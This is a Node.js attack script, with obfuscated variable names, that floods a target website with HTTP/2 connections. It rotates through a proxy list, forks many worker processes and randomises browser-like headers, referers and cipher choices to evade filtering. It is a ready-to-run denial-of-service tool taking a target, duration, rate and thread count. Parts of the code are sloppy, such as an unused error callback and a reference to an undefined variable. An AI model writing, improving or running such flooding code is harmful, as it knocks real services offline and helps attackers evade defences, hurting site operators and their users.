const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const UserAgent = require("user-agents");
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x299607) {});
if (process.argv.length < 0x7) {
  console.log("Usage: target time rate thread proxyfile");
  process.exit();
}
const headers = {};
function readLines(_0xdebccf) {
  return fs.readFileSync(_0xdebccf, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x11f726, _0x2dab6b) {
  return Math.floor(Math.random() * (_0x2dab6b - _0x11f726) + _0x11f726);
}
function randomElement(_0x508841) {
  return _0x508841[Math.floor(Math.random() * (_0x508841.length - 0x0) + 0x0)];
}
function randstr(_0x1c0cce) {
  let _0x200940 = '';
  const _0x3f9f90 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.length;
  for (let _0x1800da = 0x0; _0x1800da < _0x1c0cce; _0x1800da++) {
    _0x200940 += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random() * _0x3f9f90));
  }
  return _0x200940;
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
const ip_spoof1 = () => {
  return '' + Math.floor(Math.random() * 0xc350);
};
async function editedline() {
  try {} catch (_0x1cb62d) {}
}
editedline();
const args = {
  'target': process.argv[0x2],
  'time': parseInt(process.argv[0x3]),
  'Rate': parseInt(process.argv[0x4]),
  'threads': parseInt(process.argv[0x5]),
  'proxyFile': process.argv[0x6]
};
const sig = ["ecdsa_secp256r1_sha256", 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const cplist = ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384"];
const accept_header = ["*/*", "image/*", "image/webp,image/apng", "text/html", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"];
lang_header = ["ko-KR", 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', "en-GB", 'en-AU', "en-ZA"];
const encoding_header = ["gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", 'deflate'];
const control_header = ["no-cache", 'max-age=0'];
const refers = ['https://www.google.com/', 'https://www.facebook.com/', "https://www.twitter.com/", 'https://www.youtube.com/', "https://www.linkedin.com/", "https://proxyscrape.com/", "https://www.instagram.com/", "https://wwww.reddit.com/", "https://fivem.net/", "https://www.fbi.gov/", 'https://nettruyenplus.com/', 'https://vnexpress.net/', "https://zalo.me", "https://shopee.vn", "https://www.tiktok.com/", 'https://google.com.vn/', "https://tuoitre.vn/", "https://thanhnien.vn/", "https://nettruyento.com/"];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"];
version = ["\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \";Not A Brand\";v=\"99\"", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\""];
platform = ["Linux", 'Windows'];
site = ['cross-site', "same-origin", "same-site", 'none'];
mode = ['cors', 'navigate', "no-cors", "same-origin"];
dest = ["document", 'image', "embed", "empty", "frame"];
const rateHeaders = [{
  'akamai-origin-hop': randstr(0xc)
}, {
  'proxy-client-ip': randstr(0xc)
}, {
  'via': randstr(0xc)
}, {
  'cluster-ip': randstr(0xc)
}];
model = ['Windows', "Linux x86_64", "AMD64"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
var model1 = model[Math.floor(Math.floor(Math.random() * model.length))];
var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x682a4, _0x2e09b1) {
    const _0x4ef0f6 = "CONNECT " + _0x682a4.address + ":443 HTTP/1.1\r\nHost: " + _0x682a4.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x30dcd9 = new Buffer.from(_0x4ef0f6);
    const _0x3d92f2 = net.connect({
      'host': _0x682a4.host,
      'port': _0x682a4.port
    });
    _0x3d92f2.setTimeout(_0x682a4.timeout * 0x186a0);
    _0x3d92f2.setKeepAlive(true, 0x186a0);
    _0x3d92f2.on("connect", () => {
      _0x3d92f2.write(_0x30dcd9);
    });
    _0x3d92f2.on("data", _0x368caa => {
      const _0xdc3719 = _0x368caa.toString("utf-8");
      const _0x158c1e = _0xdc3719.includes("HTTP/1.1 200");
      if (_0x158c1e === false) {
        _0x3d92f2.destroy();
        return _0x2e09b1(undefined, "error: invalid response from proxy server");
      }
      return _0x2e09b1(_0x3d92f2, undefined);
    });
    _0x3d92f2.on("timeout", () => {
      _0x3d92f2.destroy();
      return _0x2e09b1(undefined, "error: timeout exceeded");
    });
    _0x3d92f2.on('error', _0x269849 => {
      _0x3d92f2.destroy();
      return _0x2e09b1(undefined, "error: " + _0x269849);
    });
  }
}
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51"];
const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
const userAgent = new UserAgent();
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[':authority'] = parsedTarget.host;
headers[":path"] = parsedTarget.path + '?' + randstr(0xa) + '=' + randstr(0x5);
headers[":scheme"] = "https";
headers.origin = "https://huntervm.click";
headers['sec-ch-ua'] = ver;
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-ch-ua-mobile"] = '?0';
headers['accept-encoding'] = encoding;
headers["accept-language"] = lang;
headers['user-agent'] = randstr(0x19);
headers["upgrade-insecure-requests"] = '1';
headers.accept = accept;
headers['sec-fetch-mode'] = "navigate";
headers["sec-fetch-dest"] = "document";
headers['sec-fetch-site'] = "same-origin";
headers.TE = "trailers";
headers["sec-fetch-user"] = '?1';
headers['x-requested-with'] = 'XMLHttpRequest';
function runFlooder() {
  const _0x1d3dc8 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x182264 = _0x1d3dc8.split(':');
  const _0x148c62 = {
    'host': _0x182264[0x0],
    'port': ~~_0x182264[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x12c
  };
  Socker.HTTP(_0x148c62, (_0x49cb0a, _0x541cc3) => {
    if (_0x541cc3) {
      return;
    }
    _0x49cb0a.setKeepAlive(true, 0x30d40);
    const _0x36d106 = {
      'secure': true,
      'ALPNProtocols': ['h2'],
      'sigals': siga,
      'socket': _0x49cb0a,
      'ciphers': cipper,
      'ecdhCurve': 'prime256v1:secp384r1:secp521r1',
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_method"
    };
    const _0x6bec0c = tls.connect(0x1bb, parsedTarget.host, _0x36d106);
    _0x6bec0c.setKeepAlive(true, 0xea60);
    const _0x31ef20 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x2710,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x6bec0c,
      'socket': _0x49cb0a
    });
    _0x31ef20.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x2710,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    _0x31ef20.on("connect", () => {});
    _0x31ef20.on("close", () => {
      _0x31ef20.destroy();
      _0x49cb0a.destroy();
      return;
    });
  }, function (_0x5d6257, _0x266d89, _0x50dc14) {
    connection.destroy();
    console.log("Error:", _0x5d6257);
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);
